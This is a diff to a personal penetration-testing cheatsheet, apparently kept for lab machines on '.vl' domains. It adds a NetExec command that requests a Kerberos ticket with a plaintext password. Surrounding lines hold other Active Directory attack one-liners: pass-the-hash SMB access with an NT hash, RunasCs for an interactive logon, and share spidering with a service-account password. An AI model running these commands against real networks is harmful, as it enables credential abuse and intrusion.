@@ -1,5 +1,6 @@
 # CHEATSHEETS
 
+nxc smb DC-JPQ225.cicada.vl -u Rosie.Powell -p Cicada123 -k --generate-tgt Rosie	# generate kerberos ticket
 RunasCs.exe whatever whatever qwinsta -l 9	# Get session ID | Get interactive shell login type 9 |  type 9 logins it doesn’t actually check the creds, but I need to put something into those arguments
 smbclient -U Simon.Watson --pw-nt-hash //shibuya.vl/users 5d8c3d1a20bd63f60f469f6763ca0d50	# smbcliente connect with hash
 nxc smb shibuya.vl -u svc_autojoin -p 'K5&A6Dw9d8jrKWhV' --spider 'images$' --regex .	# --spider 'images$' to get a file listing of the images$ share (using --regex . to get all files)
